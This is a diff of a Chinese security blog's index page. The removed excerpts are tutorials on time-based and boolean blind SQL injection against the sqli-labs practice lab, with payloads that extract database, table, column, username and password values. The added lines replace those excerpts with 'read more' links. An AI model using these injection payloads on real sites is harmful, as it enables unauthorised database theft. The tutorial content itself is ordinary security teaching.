@@ -204,7 +204,7 @@
               <span class="post-meta-item-text">发表于</span>
               
 
-              <time title="创建时间：2023-03-30 10:46:42 / 修改时间：11:19:16" itemprop="dateCreated datePublished" datetime="2023-03-30T10:46:42+08:00">2023-03-30</time>
+              <time title="创建时间：2023-03-30 10:46:42 / 修改时间：11:20:40" itemprop="dateCreated datePublished" datetime="2023-03-30T10:46:42+08:00">2023-03-30</time>
             </span>
 
           
@@ -220,28 +220,14 @@
       
           <p><strong>时间盲注</strong></p>
 <p>适用于页面不会返回错误信息，只会回显一种界面。<br>与bool盲注不同的是时间盲注可在不显示报错的页面使用。</p>
-<p>原理：利用sleep()或benchmark()等函数让mysql执行时间变长经常与if(expr1,expr2,expr3)语句结合使用，通过页面的响应时间来判断条件是否正确。if(expr1,expr2,expr3)含义是如果expr1是True,则返回expr2,否则返回expr3</p>
-<p>简单来说：<strong>利用sleep等函数，制造时间延迟，由回显时间来判断是否报错。</strong></p>
-<p>时间盲注需要几个函数的辅助，就先来了解一下这几个函数</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">if（判断语句，x，y）如果判断语句正确则输出X，否则输出Y;</span><br><span class="line">sleep(X)函数，延迟X秒后回显;</span><br><span class="line">if(1=1,1,sleep(1))即输出一;</span><br><span class="line">if(1=2,1,sleep(1))即延迟一秒后回显;</span><br></pre></td></tr></table></figure>
-<p><strong>闭合符号的判断</strong><br>由于没有报错提示，我们要用if和sleep函数判断闭合符号。<br>如果构成闭合，则会执行闭合后的代码，且闭合内部的代码并不会被执行。</p>
-<p>如sqli-labs第九关<br><img src="/images/%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8/20210424192951799.jpg" alt="1"><br>反应了三秒，所以证明闭合符号为’</p>
-<p><strong>时间盲注的常用语句</strong><br>判断库名长度</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and if(length(database())&gt;8,sleep(2),0) --+;</span><br></pre></td></tr></table></figure>
-
-<p>判断库名</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and if(ascii(substr(database(),1,1))=115,sleep(2),0) --+;</span><br></pre></td></tr></table></figure>
-<p>判断表名</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1’ and if(ascii(substr((select table_name from information_schema.tables where table_schema=‘security’ limit x,y),z,d))=e,sleep(1),0)–+;</span><br></pre></td></tr></table></figure>
-<p>其中x代表第x+1个表，y表示第x+1往后y个单位的表，z表示第几个字母，d表示z往后d个单位的字母</p>
-<p>判断列名</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1’ and If(ascii(substr((select column_name from information_schema.columns where table_name=‘users’ and table_schema=database() limit x,y),z,d))=105,sleep(2),1)–+;</span><br></pre></td></tr></table></figure>
-<p>x：第x+1个列，y：x+1个列往后y个单位，z：x+1列的第一个字母，d：第一个字母往后的第z个单位</p>
-<p>爆数据</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and If(ascii(substr((select username from users limit 0,1),1,1))=68,sleep(2),1)--+;</span><br></pre></td></tr></table></figure>
-
-
-
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2023/03/30/%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
       
     </div>
 
@@ -285,7 +271,7 @@
               <span class="post-meta-item-text">发表于</span>
               
 
-              <time title="创建时间：2023-03-30 10:40:54 / 修改时间：10:45:56" itemprop="dateCreated datePublished" datetime="2023-03-30T10:40:54+08:00">2023-03-30</time>
+              <time title="创建时间：2023-03-30 10:40:54 / 修改时间：11:20:34" itemprop="dateCreated datePublished" datetime="2023-03-30T10:40:54+08:00">2023-03-30</time>
             </span>
 
           
@@ -301,19 +287,14 @@
       
           <p><strong>布尔盲注</strong></p>
 <p>原理：<br>注入的时候只会返回True和False，所以布尔盲注就是根据页面显示的是True还是False进行猜测数据库中的信息。</p>
-<p>布尔盲注需要几个函数的辅助，就先来了解一下这几个函数</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">length()函数可返回字符串的长度;</span><br><span class="line">substring()函数可以截取字符串，可指定开始的位置和截取的长度;</span><br><span class="line">ord()函数可以返回单个字符的ASCII码;</span><br><span class="line">char()函数可将ASCII码转换为对应的字符;</span><br></pre></td></tr></table></figure>
-<p>布尔盲注常用语句</p>
-<p>爆数据库长度</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and (length(database()))&gt;1 --+;</span><br></pre></td></tr></table></figure>
-<p>1.<br>爆数据库名</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and (ascii(substr(database(),1,1)))&gt;1 --+;</span><br></pre></td></tr></table></figure>
-<p>2.<br>爆表名</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)))&gt;1 --+;</span><br></pre></td></tr></table></figure>
-<p>3.<br>爆列名</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and (ascii(substr((select column_name from information_schema.columns where table_name=&#x27;users&#x27; limit 0,1),1,1)))&gt;1 --+;</span><br></pre></td></tr></table></figure>
-<p>4.<br>爆值<br>登录后复制 </p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and (ascii(substr(( select password from users limit 0,1),1,1)))&gt;1--+;</span><br></pre></td></tr></table></figure>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2023/03/30/bool%E7%9B%B2%E6%B3%A8/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
       
     </div>
 
@@ -435,7 +416,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2023-03-22 21:47:34" itemprop="dateModified" datetime="2023-03-22T21:47:34+08:00">2023-03-22</time>
+                <time title="修改时间：2023-03-30 11:20:36" itemprop="dateModified" datetime="2023-03-30T11:20:36+08:00">2023-03-30</time>
               </span>
 
           
